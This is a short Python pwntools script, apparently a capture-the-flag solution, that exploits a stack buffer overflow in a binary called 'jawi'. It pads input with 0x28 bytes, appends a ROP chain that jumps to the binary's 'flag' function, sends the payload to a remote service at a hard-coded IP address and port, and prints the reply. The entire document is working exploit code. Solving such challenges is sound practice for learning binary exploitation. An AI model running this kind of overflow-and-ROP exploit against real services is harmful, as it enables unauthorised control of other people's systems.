from pwn import *
elf = context.binary = ELF("./jawi", checksec=False)

# p = process("./jawi")
p = remote("103.28.91.24", 10005)

rop = ROP(elf)
RET_ADDR = 0x401016
FLAG_ADDR = elf.symbols.flag
rop.raw(RET_ADDR)
rop.raw(FLAG_ADDR)

payload = b'A'*0x28 + rop.chain()
p.sendlineafter(b"Input: ", payload)

response = p.recvall(timeout=1).strip()
print(response)

p.close()